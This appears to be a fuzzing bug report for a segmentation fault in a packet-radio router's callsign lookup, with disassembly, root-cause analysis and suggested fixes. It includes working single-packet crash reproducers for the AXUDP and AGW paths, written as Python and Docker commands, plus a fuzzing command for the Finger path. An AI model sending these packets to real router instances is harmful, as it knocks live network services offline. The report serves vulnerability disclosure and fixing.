# Bug `c0338d880e86` — SIGSEGV in callsign-lookup at 0x41222f

| field            | value                                          |
|------------------|------------------------------------------------|
| signal           | `SIGSEGV`                                      |
| RIP              | `0x41222f`                                     |
| crashing insn    | `movzwl 0x2(%rax),%eax`                        |
| triggering RAX   | `0x992f80` (consistently; data-segment-ish)    |
| triggering RDX   | last two callsign characters, shifted-left-1   |
| version range    | 505c (latest); also present in all prior shipped versions |
| arch reach       | amd64, arm64, armv7 — see initial FINDINGS.md |
| reachable from   | AXUDP, AGW, HTTP, NetRom, Finger              |
| exploitability   | DoS today; wild-pointer deref so memory corruption likely if value at `0x992f80` becomes attacker-controlled later |

## Summary

A 2-byte read at `[rax + 2]` faults because the pointer in `rax` is loaded
from a stale or wild slot. The compare against `%dx` is part of a
callsign-character match loop — `dx` holds two AX.25-encoded characters
of the source/destination callsign of the inbound packet. The lookup
visits a linked list / array of callsign records and one of the entries
points to invalid memory.

Reproduced from at least five fuzzers, all hitting the *same* RIP:

| fuzzer        | example trigger                                            |
|---------------|------------------------------------------------------------|
| AXUDP (FINDINGS.md) | 38-byte UI frame, PID 0xCD (ARP) with 20-byte info   |
| AGW PE        | 36-byte header, kind=0xA2, callfrom field looks like a callsign |
| HTTP          | stateful — reached after a long run                        |
| NetRom L3     | UI frame with PID 0xCF carrying a short NetRom-shaped body |
| Finger        | mutated finger query line                                  |

This is not a "PID 0xCD parser bug" as initially thought — it's a more
general callsign-table walker that gets fed an inbound source/dest
callsign from many parsing paths and dereferences a corrupt record.

## Disassembly (function entry @ `0x41220c`)

```
0x41221a:  cmpq   $0x0, -0x88(%rbp)        ; NULL check on the table entry
0x412222:  je     0x412252                  ; if NULL, skip to fallback
0x412224:  movzwl -0x5e(%rbp), %edx         ; load 2 bytes of the search key (callsign chars)
0x412228:  mov    -0x88(%rbp), %rax         ; load the table entry pointer
0x41222f:  movzwl 0x2(%rax), %eax           ; <-- FAULT: deref [rax+2]
0x412233:  cmp    %ax, %dx                  ; compare callsign chars
0x412236:  jne    0x412252                  ; no match -> fallback
```

The pointer at `[rbp-0x88]` passes its NULL check but points to address
`0x992f80`, which is mapped (no fault on the address itself) but
appears to be uninitialised or freed table memory — `[rax+2]` is in an
unmapped page. The fact that the same RAX value (`0x992f80`) shows up
in every crash across very different fuzzers suggests it's a static
pointer slot that's been corrupted by an earlier parse, not random
stack garbage.

## Reproducer — AXUDP path (smallest known)

The cleanest stateless single-packet trigger is the PID-0xCD one
already documented in `fuzz/FINDINGS.md`:

```sh
# Boot a clean target (uses fuzz/XROUTER.CFG)
docker run -d --name xr-poc \
    -v "$(pwd)/fuzz:/data" \
    -p 18080:80 -p 10093:10093/udp \
    ghcr.io/packethacking/xrouter:505c-amd64
sleep 5
curl -s -o /dev/null -w 'before: HTTP=%{http_code}\n' http://127.0.0.1:18080/

python3 -c '
import socket
p = bytes.fromhex(
  "8e7288aa9a40e0" "8caab4b48aa46f" "03cd"
  "8caab4b48aa46e8e7288aa9a4062190000000003" "3af4")
socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(p, ("127.0.0.1", 10093))
'
sleep 1
curl -s -o /dev/null -w 'after : HTTP=%{http_code}\n' http://127.0.0.1:18080/
docker logs xr-poc | tail -3
docker rm -f xr-poc
```

Expected:
```
before: HTTP=200
after : HTTP=000
--- /usr/local/bin/xrouter version 505c started ---
Segmentation fault
```

## Reproducer — AGW path

```sh
python3 -c '
import socket
p = bytes.fromhex(
  "00000000"          # port = 0
  "a2"                # kind = 0xA2 (undefined verb)
  "00" "00" "00"      # reserved/pid/reserved
  "10d5525a455293289500"   # callfrom (looks-like-callsign garbage)
  "473944554d2d3120" "0000" # callto = "G9DUM-1 \\x00\\x00"
  "00000000"          # datalen = 0
  "00000000"          # user
)
s = socket.create_connection(("127.0.0.1", 18082), timeout=2)
s.sendall(p)
s.close()
'
```

(Use the AGWPORT for whichever instance you're running; `fuzz/run-all.sh`
puts AGW on `HTTP_BASE + 2`, so `18212` for the `agw` instance.)

## Reproducer — Finger path

The finger crash came from a mutated query line; the exact bytes are in
`/work/xr/run-finger/bugs/c0338d880e86/core` (only the core was saved;
the per-frame trigger hasn't been minimised yet). The campaign found
it within ~150 queries, so a 30-second fuzz reliably reproduces it:

```sh
python3 fuzz/finger-fuzz.py --name fpoc --http-port 18260 \
    --udp-port 20260 --finger-port 18264 --duration 60
```

## Suggested fix

There are at least two layers to address:

1. **Make the callsign-table walker robust to corrupted entries.**
   Add a sanity check before `[rax+2]`: the entry pointer should land
   inside the known table-arena bounds (it isn't, here — `0x992f80` is
   data-segment-adjacent, not inside the dynamically-allocated table).
   A simple bounds check would convert this from a wild-deref crash
   into a "skip and log" event.

2. **Find where the table is being corrupted in the first place.**
   The fact that the same `RAX = 0x992f80` shows up across crashes
   triggered by ARP / NetRom / AGW / Finger inputs strongly suggests
   that something writes a stale pointer into a static linked-list head
   somewhere — possibly the parser that handles PID 0xCD when the info
   field is short of the RFC 1042 ARP minimum, then leaves a partial
   callsign record dangling. Auditing the ARP-over-AX.25 ingest path
   (PID 0xCD with info-length < 30) is the highest-leverage starting
   point.
